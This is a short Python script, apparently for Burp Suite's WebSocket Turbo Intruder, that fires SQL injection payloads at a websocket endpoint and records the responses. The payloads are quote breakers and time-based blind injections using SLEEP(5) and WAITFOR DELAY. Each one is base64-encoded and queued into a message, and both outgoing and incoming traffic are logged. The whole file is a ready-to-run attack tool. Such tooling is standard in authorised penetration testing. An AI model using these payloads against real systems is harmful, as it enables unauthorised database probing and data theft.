import base64

# Define sql injection payloads
payloads = [
        "''",
        "'",
        "' OR SLEEP(5)/*",
        "' OR '1'='1' AND SLEEP(5)/*",
        "' OR SLEEP(5); -- asdf",
        "' OR '1'='1' AND SLEEP(5); -- asdf",
        "' ; WAITFOR DELAY '00:00:05' --"
    ]

def queue_websockets(upgrade_request, message):
    connection1 = websocket_connection.create(upgrade_request,websocket_connection.config())
    for payload in payloads:
        connection1.queue(message, base64.b64encode(payload))

def handle_outgoing_message(websocket_message, interesting):
    results_table.add(websocket_message)

def handle_incoming_message(websocket_message, interesting):
    results_table.add(websocket_message)

